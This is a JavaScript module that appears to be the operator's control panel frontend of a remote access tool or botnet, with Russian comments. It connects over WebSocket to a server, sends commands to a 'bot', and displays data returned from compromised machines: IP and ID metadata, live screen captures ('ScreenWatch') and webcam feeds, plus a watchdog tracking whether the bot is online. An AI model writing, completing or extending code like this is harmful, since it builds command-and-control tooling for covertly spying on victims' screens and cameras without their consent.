// frontend/client_control/js/modules/websocket/connection.js

import { AppState } from '../core/states.js';
import { decodePacket, encodePacket } from '../../../../dashboard/js/modules/websocket/protocol.js';
import { renderScreenRGBA } from '../features/screen_renderer.js';

let socket = null, botWatchdog = null;
const decoder = new TextDecoder();

const updateUI = (id, val) => {
    const el = document.getElementById(id);
    if (el) el.textContent = val || '...';
};

const setOnline = (isOnline) => {
    const indicator = document.getElementById('status-indicator');
    if (indicator) indicator.classList.toggle('online', isOnline);
    updateUI('status-text', isOnline ? 'online' : 'offline');
};

function handleIncomingData(buffer) {
    const pkg = decodePacket(buffer);
    if (!pkg || pkg.id !== AppState.clientId) return;

    // Сбрасываем watchdog при любом валидном пакете
    setOnline(true);
    clearTimeout(botWatchdog);
    botWatchdog = setTimeout(() => setOnline(false), 10000);

    switch (pkg.module) {
        case 'DataScribe':
        case 'Heartbeat':
            try {
                const data = JSON.parse(decoder.decode(pkg.payload));
                if (data.ip) updateUI('display-ip', data.ip);
                if (data.id) updateUI('display-id', data.id);
            } catch (e) { console.warn("[WS] Metadata Error"); }
            break;

        case 'ScreenWatch':
            if (pkg.payload.byteLength > 200) renderScreenRGBA(pkg.payload);
            break;

        case 'Webcam':
            // Используем глобальную функцию или диспетчер событий
            if (window.renderWebcam) {
                window.renderWebcam(pkg.payload);
            }
            break;

        default:
            window.dispatchEvent(new CustomEvent('binaryDataReceived', { detail: pkg }));
    }
}

export function initControlConnection() {
    const { token, login } = {
        token: localStorage.getItem('auth_token'),
        login: localStorage.getItem('user_login')
    };

    if (!token || !login || !AppState.clientId) return;

    const prot = location.protocol === 'https:' ? 'wss:' : 'ws:';
    socket = new WebSocket(`${prot}//${location.host}/ws?token=${token}&login=${login}&mode=control`);
    socket.binaryType = 'arraybuffer';

    socket.onopen = () => {
        console.log("🚀 [WS] Connected");
        window.sendToBot("DataScribe", "get_metadata");

        setInterval(() => {
            if (socket?.readyState === 1) socket.send(encodePacket("", "Heartbeat", "ping"));
        }, 25000);
    };

    socket.onmessage = (e) => e.data instanceof ArrayBuffer && handleIncomingData(e.data);
    socket.onclose = () => { setOnline(false); clearTimeout(botWatchdog); };

    window.sendToBot = (mod, pay) => {
        if (socket?.readyState === 1) {
            socket.send(encodePacket(AppState.clientId, mod, pay));
        }
    };
}